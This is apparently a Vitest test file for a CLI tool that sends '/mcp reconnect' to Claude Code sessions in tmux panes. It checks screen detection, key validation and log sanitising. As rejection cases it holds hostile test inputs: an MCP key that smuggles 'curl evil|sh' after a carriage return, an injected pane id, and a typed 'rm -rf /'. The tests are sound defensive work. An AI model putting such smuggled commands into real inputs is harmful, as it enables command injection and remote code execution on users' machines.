import { describe, it, expect, vi } from "vitest";
import { composerState, reconnect, safeKey, undimmed, RECONNECT_HELP } from "../src/cli/reconnect.ts";
import { brokerKeyOf, mcpEntry, SkippedFolder } from "../src/cli/mcp-config.ts";
import { TmuxTimeout, type Pane, type TmuxServer } from "../src/cli/tmux.ts";
import { makeDeps, config, GROUPS } from "./helpers/cli-deps.mjs";

const DIR = "/run/gh-broker/agents";
const SOCK = "/tmp/tmux-1000/default";
const claude = (u: string) => `/home/${u}/.claude.json`;
const entry = JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR) } });

// Captured from live Claude Code panes (tmux capture-pane -p -J, this machine, 2026-11-21; the
// SGR escapes `-e` now keeps are left out where they don't matter),
// excerpted to the relevant region; rule lines shortened to 40 columns, trailing column padding
// stripped. The current TUI keeps the empty input box ("❯") visible while it works, its working
// indicator is a spinner-glyph line ("✻ Waiting for 1 background agent to finish") with no
// ellipsis and no "esc to interrupt", and a finished turn shows "✻ … · done <time>".
const RULE = "────────────────────────────────────────";
const IDLE = `❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
const BUSY = `✻ Waiting for 1 background agent to finish

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle) · ↓ to manage

  ● main
  ◯ general-purpose  Addressing round-1 review blockers in tmux.ts    54s · ↓ 240.5k tokens`;
const DONE = `✻ Baked for 29s · done 9:55 AM
                                  new task? /clear to save 865.3k tokens

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle)`;
// A draft whose first line is blank (shift+enter first): the text sits under the "❯" line.
const BLANK_FIRST_DRAFT = `${RULE}
❯
  this is the second line of the draft
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// A working-indicator line wrapped by a narrow pane (what capture without -J returns): the glyph
// line's first fragment carries no ellipsis at all.
const WRAPPED_BUSY = `✻ Fixing the flaky test in
src/agents.ts… (esc to
interrupt · 32s)`;
// A shell's PS2 continuation: the bottom-most ">" line is empty while the shell owns the tty.
const PS2_SHELL = `$ for f in *; do
>
`;
// The installed Claude Code (2.1.326) rotates its spinner through "*", "·" and "✢" frames too
// whenever TERM isn't xterm-ghostty — i.e. always inside tmux; a capture on the "*" frame used to
// read idle (roughly one capture in six, and the re-capture often lands on the same frame).
const STAR_FRAME = `* Considering what to do next

${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// A working-indicator shape the glyph list doesn't know, sitting directly above the composer's
// top rule: the box is still empty, so it is sent to.
const ABOVE_RULE = `⌛ Crunching the numbers
${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// The live box as \`capture-pane -e\` returns it (this machine, 2026-11-22): "❯" plus a no-break
// space, with Claude Code's prompt suggestion in SGR 2 (dim). Above it, the user's earlier message
// in the transcript ("❯" plus a plain space, its own colours) and the reply under it.
const SUGGESTION = `\x1b[38;5;246m\x1b[48;5;237m❯ \x1b[38;5;231mServer upgrade is mine?\x1b[39m
\x1b[39m● Yes. The upgrade needs root.

\x1b[38;5;244m${RULE}\x1b[39m
\x1b[39m❯\u00a0\x1b[2mcontinue\x1b[0m
\x1b[38;5;244m${RULE}\x1b[39m
\x1b[38;5;211m  ⏵⏵ bypass permissions on\x1b[38;5;246m (shift+tab to cycle)\x1b[39m
\x1b[39m  ● main
  ◯ general-purpose  Cleaning up helper worktrees    5h 6m 9s · ↓ 398.7k tokens`;
// The same box with text typed into it: not dim.
const TYPED_NBSP = `${RULE}
\x1b[39m❯\u00a0rerun the tests\x1b[39m
${RULE}`;
// A draft whose continuation lines start with "?" or "●" — the footer detector must not stop on them.
const DRAFT_QUESTION = `${RULE}
❯
  ? why does the socket drop
  ● and list the suspects
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;

describe("undimmed", () => {
	it("drops dim text and every escape, keeping the rest", () => {
		expect(undimmed("\x1b[39m❯\u00a0\x1b[2mcontinue\x1b[0m")).toBe("❯\u00a0");
		expect(undimmed("a\x1b[2mb\x1b[22mc\x1b[2md\x1b[me")).toBe("ace");
		expect(undimmed("\x1b[1;2mdim bold\x1b[0;1m bold")).toBe(" bold");
		expect(undimmed("\x1b[38;5;246m\x1b[48;5;237m❯ \x1b[38;5;231mhi\x1b[39m")).toBe("❯ hi");
		expect(undimmed("\x1b[2mnever reset")).toBe("");
		expect(undimmed("x\x1b[2Ky")).toBe("xy");
		expect(undimmed("plain")).toBe("plain");
	});
});

describe("composerState (heuristic over Claude Code's screen)", () => {
	it("reads the live input line", () => {
		expect(composerState(IDLE)).toBe("empty");
		expect(composerState(BUSY)).toBe("empty"); // the current TUI keeps the box visible while working, and what is typed queues
		expect(composerState(STAR_FRAME)).toBe("empty");
		expect(composerState(ABOVE_RULE)).toBe("empty");
		expect(composerState(WRAPPED_BUSY)).toBe("none");
		expect(composerState(DONE)).toBe("empty");
		expect(composerState(`❯ /mcp reconnect all`)).toBe("typing");
		expect(composerState("> /mcp")).toBe("typing");
	});

	it("reads a dim prompt suggestion in the live box as empty, not the transcript message above it as typing", () => {
		expect(composerState(SUGGESTION)).toBe("empty");
		expect(composerState(TYPED_NBSP)).toBe("typing");
	});

	it("sees a draft whose first line is blank", () => {
		expect(composerState(BLANK_FIRST_DRAFT)).toBe("typing");
	});

	it("a permission dialog reads as typing (skipped — the safe direction), a prompt-less screen as none", () => {
		expect(composerState("Do you want to proceed?\n❯ 1. Yes\n  2. No (esc)")).toBe("typing");
		expect(composerState("!\n  ! for bash mode")).toBe("none");
		expect(composerState("")).toBe("none");
	});

	it("a draft whose continuation starts with ? or ● is still typing — only the known footers stop the scan", () => {
		expect(composerState(DRAFT_QUESTION)).toBe("typing");
	});

	it("takes the bottom-most prompt line, so a user message in the transcript doesn't count", () => {
		expect(composerState(`${IDLE}\n❯ and one more thing`)).toBe("typing");
	});

	it("the PS2 continuation reads empty — the foreground check is what protects that pane", () => {
		expect(composerState(PS2_SHELL)).toBe("empty");
	});
});

describe("safeKey", () => {
	it("allows the names mcp-config writes, and nothing that could carry a newline or a command", () => {
		for (const k of ["github", "gh-broker", "gh-broker-repo", "A.b_c-9"]) expect(safeKey(k)).toBe(true);
		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"]) expect(safeKey(k)).toBe(false);
	});
});

describe("brokerKeyOf (what mcp-config wrote, read back)", () => {
	it("reads the broker entry's key out of a .claude.json text, or none", () => {
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR), x: { command: "npx" } } }), DIR)).toBe("github");
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { x: { command: "npx" } } }), DIR)).toBeUndefined();
		expect(brokerKeyOf("{nope", DIR)).toBeUndefined();
		expect(brokerKeyOf("[]", DIR)).toBeUndefined();
		expect(brokerKeyOf(undefined, DIR)).toBeUndefined();
	});
});

describe("agent reconnect", () => {
	const info = { uid: 1000, gid: 1000, home: "/home/repo" };
	/** Deps whose tmux has `panes` on SOCK; tmuxPaneText re-captures `fresh` (an idle screen by default; `null` means the pane is gone). */
	const SERVER: TmuxServer = { socket: SOCK, binary: "/usr/bin/tmux" };
	function withPanes(panes: Pane[], over: Record<string, unknown> = {}, files: Record<string, string> = {}, fresh: string | null = "❯ \n", dead: { socket: string; why: string }[] = []) {
		return makeDeps(
			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })), tmuxPanes: vi.fn((_server: TmuxServer, _info: unknown) => panes), tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)), ...over },
			{ [claude("repo")]: entry, ...files }
		);
	}
	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({ id, pid: 200, text, foreground: true, inMode: false, synchronized: false, ...over });

	it("sends /mcp reconnect with the agent's own key, as the agent, and lists it as sent", () => {
		const { d, out } = withPanes([pane("%3", IDLE), pane("%4", IDLE, { foreground: false })]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSockets).toHaveBeenCalledWith(info);
		expect(d.tmuxPanes).toHaveBeenCalledWith(SERVER, info);
		expect(d.tmuxPaneText).toHaveBeenCalledWith(SERVER, "%3", info);
		expect(d.tmuxSend).toHaveBeenCalledTimes(1);
		expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%3", "/mcp reconnect github", info);
		expect(out).toContain(`repo ${SOCK} %3 github sent`);
		expect(out).toContain(`repo ${SOCK} %4 github skipped (claude is not the pane's foreground job)`);
		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
	});

	it("--dry-run lists what it would send where, sends nothing, and doesn't re-capture", () => {
		const { d, out } = withPanes([pane("%3", IDLE)]);
		expect(reconnect(["repo", "--dry-run"], config, d)).toBe(0);
		expect(d.tmuxSend).not.toHaveBeenCalled();
		expect(d.tmuxPaneText).not.toHaveBeenCalled();
		expect(out).toContain(`repo ${SOCK} %3 github would send`);
		expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
	});

	it("re-captures before sending: a pane gone or typed into since the check is skipped, one that started working is still sent to", () => {
		const gone = withPanes([pane("%1", IDLE)], {}, {}, null);
		expect(reconnect(["repo"], config, gone.d)).toBe(1);
		expect(gone.out).toContain(`repo ${SOCK} %1 github skipped (gone since capture)`);
		expect(gone.d.tmuxSend).not.toHaveBeenCalled();
		const busy = withPanes([pane("%2", IDLE)], {}, {}, BUSY);
		expect(reconnect(["repo"], config, busy.d)).toBe(0);
		expect(busy.out).toContain(`repo ${SOCK} %2 github sent`);
		const typed = withPanes([pane("%3", IDLE)], {}, {}, "❯ rm -rf /\n");
		expect(reconnect(["repo"], config, typed.d)).toBe(1);
		expect(typed.out).toContain(`repo ${SOCK} %3 github skipped (changed since capture)`);
	});

	it("skips copy mode and synchronize-panes before anything else", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { inMode: true }), pane("%2", IDLE, { synchronized: true })]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (pane is in copy mode)`);
		expect(out).toContain(`repo ${SOCK} %2 - skipped (synchronize-panes is on)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("sends to a working pane and one showing a prompt suggestion; skips one with text in the composer, a dialog, and one without a prompt", () => {
		const { d, out } = withPanes([
			pane("%1", BUSY),
			pane("%2", "❯ fix the reconnect test"),
			pane("%3", "Do you want to proceed?\n1. Yes\n2. No (esc)"),
			pane("%4", SUGGESTION),
			pane("%5", "Do you want to proceed?\n❯ 1. Yes\n  2. No (esc)")
		]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
		expect(out).toContain(`repo ${SOCK} %1 github sent`);
		expect(out).toContain(`repo ${SOCK} %4 github sent`);
		expect(out).toContain(`repo ${SOCK} %2 github skipped (composer not empty, or a dialog is showing)`);
		expect(out).toContain(`repo ${SOCK} %5 github skipped (composer not empty, or a dialog is showing)`);
		expect(out).toContain(`repo ${SOCK} %3 github skipped (no Claude Code prompt on screen)`);
	});

	it("skips a pane when the session's files have no broker entry, and never borrows another folder's key", () => {
		const SAVED = "/data/claude-saved";
		const saved = JSON.stringify({ mcpServers: { "gh-broker": mcpEntry("repo", DIR) } });
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: "/home/repo/.claude-alt" })]),
				mcpIO: { read: (p: string) => (p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined), write: () => {} }
			},
			{ [claude("repo")]: JSON.stringify({ mcpServers: { x: { command: "npx" } } }), [`${SAVED}/.claude.json`]: saved }
		);
		// The session's own folder and the home file have no entry; the saved folder has one, but
		// its key may be wrong for this session — skipped, not borrowed.
		expect(reconnect(["repo"], { ...config, claudeConfigDirs: { repo: [SAVED] } }, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (no broker MCP entry in its .claude.json files)`);
	});

	it("sends the key from the session's own config folder, else the home file's", () => {
		const ALT = "/home/repo/.claude-alt";
		const files = { [claude("repo")]: entry, [`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } }) };
		const { d, out } = makeDeps(
			{ tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })), tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]), mcpIO: { read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }), write: () => {}, scan: (home: string) => (home === "/home/repo" ? [ALT] : []) } },
			files
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 gh-broker-repo sent`);
		expect(out).toContain(`repo ${SOCK} %2 github sent`);
	});

	it("refuses to type a key that could carry a newline or a command, and logs no part of it", () => {
		const evil = JSON.stringify({ mcpServers: { "github\r!curl evil|sh": mcpEntry("repo", DIR) } });
		const { d, out } = withPanes([pane("%1", IDLE)], {}, { [claude("repo")]: evil });
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (unsafe MCP key)`);
		expect(out.join("\n")).not.toContain("evil");
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("blank control characters out of a socket path in the log line, and refuse an unsafe pane id", () => {
		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] })) });
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 github sent");
		const badId = withPanes([pane("%1\r!x", IDLE)]);
		expect(reconnect(["repo"], config, badId.d)).toBe(1);
		expect(badId.out.join("\n")).toContain("skipped (unsafe pane id)");
	});

	it("carries on when a folder root won't be read", () => {
		const BROKEN = "/home/repo/.claude-broken";
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE)]),
				mcpIO: {
					read: (p: string) => (p === claude("repo") ? { text: entry, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined),
					write: () => {},
					scan: () => [BROKEN],
					pin: (folder: string) => {
						throw new SkippedFolder(`${folder} is owned by uid 0, not the agent user (uid 1000)`);
					}
				}
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 github sent`);
	});

	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
		const { d, out } = makeDeps(
			{ tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })), tmuxPanes: vi.fn((server: TmuxServer) => (server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : [])) },
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 github sent`);
		expect(out).toContain(`repo ${OTHER.socket} %7 github sent`);
	});

	it("covers every registered agent when none is named", () => {
		const { d, out } = makeDeps({}, { [claude("repo")]: entry });
		expect(reconnect([], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running (no tmux server)");
		expect(out).toContain("glmtest: no Claude Code sessions running (no tmux server)");
	});

	it("says when a tmux server runs but no pane is Claude Code", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running");
		expect(out[out.length - 1]).toBe("sent 0, skipped 0");
	});

	it("keeps going when a send fails, counts it as skipped, and sanitises the tmux error", () => {
		const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE)], {
			tmuxSend: vi.fn((_s: unknown, p: string, _t: string, _i: unknown) => {
				if (p === "%1") throw new Error("server exited unexpectedly\x1b[31m\x9b and a C1 CSI");
			})
		});
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
		expect(out).toContain(`repo ${SOCK} %1 github skipped (send failed: server exited unexpectedly?[31m? and a C1 CSI)`);
		expect(out.join("\n")).not.toContain("\x1b");
		expect(out.join("\n")).not.toContain("\x9b");
		expect(out).toContain(`repo ${SOCK} %2 github sent`);
	});

	it("lists a socket with no owning tmux process as skipped with the reason, without counting it", () => {
		const dead = [{ socket: "/tmp/tmux-1000/stale", why: "no server process for this socket" }];
		const { d, out } = withPanes([pane("%1", IDLE)], {}, {}, "❯ \n", dead);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo /tmp/tmux-1000/stale - skipped (no server process for this socket)");
		expect(out[out.length - 1]).toBe("sent 1, skipped 0");
	});

	it("a tmux server that doesn't answer in time is skipped, and the next server carries on", () => {
		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })),
				tmuxPanes: vi.fn((server: TmuxServer) => {
					if (server.socket === SOCK) throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux");
					return [pane("%9", IDLE)];
				})
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} - skipped (tmux timed out)`);
		expect(out).toContain(`repo ${OTHER.socket} %9 github sent`);
		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
	});

	it("a pane whose capture times out is skipped with the timeout reason, and the next pane is judged", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { timedOut: true }), pane("%2", IDLE)]);
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 - skipped (tmux timed out)`);
		expect(out).toContain(`repo ${SOCK} %2 github sent`);
	});

	it("a re-capture that times out skips the pane instead of judging a stale screen", () => {
		const { d, out } = withPanes([pane("%1", IDLE)], { tmuxPaneText: vi.fn(() => { throw new TmuxTimeout("tmux did not answer within 5000 ms: tmux"); }) });
		expect(reconnect(["repo"], config, d)).toBe(1);
		expect(out).toContain(`repo ${SOCK} %1 github skipped (tmux timed out)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("reports a registered agent with no user account and exits 1", () => {
		const groups = [...GROUPS, { name: "gh-broker-agent-ghost", gid: 992, members: ["gh-broker", "ghost"] }];
		const { d, err } = makeDeps({ groups: () => groups });
		expect(reconnect([], config, d)).toBe(1);
		expect(err).toEqual(["ghost: no such user"]);
	});

	it("refuses an unregistered or invalid user, two users, and unknown flags", () => {
		const { d } = withPanes([]);
		expect(() => reconnect(["nobody"], config, d)).toThrow(/"nobody" is not a registered agent/);
		expect(() => reconnect(["Bad Name"], config, d)).toThrow(/not a valid agent user name/);
		expect(() => reconnect(["repo", "glmtest"], config, d)).toThrow(/name at most one agent user/);
		expect(() => reconnect(["repo", "--json"], config, d)).toThrow("unknown flag: --json");
		expect(d.tmuxSockets).not.toHaveBeenCalled();
	});

	it("prints its help and runs nothing", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["--help"], config, d)).toBe(0);
		expect(out).toEqual([RECONNECT_HELP]);
	});
});
